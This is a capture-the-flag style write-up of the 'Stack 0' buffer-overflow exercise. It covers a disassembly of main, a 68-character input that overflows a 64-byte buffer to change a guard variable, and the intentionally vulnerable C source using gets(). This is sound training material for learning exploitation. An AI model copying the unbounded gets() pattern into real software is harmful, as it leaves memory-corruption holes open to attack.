# Stack 0

## Problem

We take the primitive approach to check the main program and we see that there is a gets() function that we can potentially exploit. From here we also know that the program will take in at least one input to store this input in some variable.

```gdb
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
```

We can also see that there is likely to be a buffer from 0x1C-0X5c, representing a total of 64bytes which could suggest that there might be a stack of such a size. On `main+33` we notice that there is a comparison before some execution.

## Idea and Attack process

We first run the program with a random guess to find out the output of the program.

```shell
./stack0
123
>>>Try again?
```

Now we can try to overflow the stack and see what happens. We try to input 64char along with 4 additional char to test.

```shell
./stack0
12345678901234567890123456789012345678901234567890123456789012341234
>>>you have changed the 'modified' variable
```

Success, and now we can see that the compare statement could be an `if` statement in the source code which is an exit and to prompt us to try again.

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```